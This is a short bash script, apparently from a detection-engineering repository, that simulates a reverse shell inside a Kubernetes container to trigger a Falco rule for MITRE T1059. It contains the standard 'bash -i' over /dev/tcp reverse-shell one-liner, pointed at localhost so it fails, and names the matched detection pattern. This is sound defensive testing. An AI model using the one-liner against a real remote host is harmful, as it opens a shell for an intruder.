#!/bin/bash
# ============================================================================
# Attack Simulation: Reverse Shell Pattern
# MITRE ATT&CK: T1059 - Command and Scripting Interpreter
# Run INSIDE a target container: kubectl exec -it <pod> -n <ns> -- sh THIS.sh
# Fires detection: detections/falco/reverse-shell.yaml   (Falco, CRITICAL)
# ============================================================================
#
# SAFE BY DESIGN: this triggers the reverse-shell *syscall pattern* Falco matches
# (`bash -i` + `/dev/tcp/`) but points at localhost:9 (discard), which refuses the
# connection. No interactive shell is ever handed to a remote host.

echo "[*] Triggering reverse-shell pattern against 127.0.0.1:9 (connection will be refused)..."
timeout 3 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1' 2>/dev/null || true   # <-- matches cmdline

echo ""
echo "[*] Expected detection: Falco 'Reverse Shell in Container' (T1059, CRITICAL)"
echo "[*] Matched on: proc.cmdline contains '/dev/tcp/' and 'bash -i'."
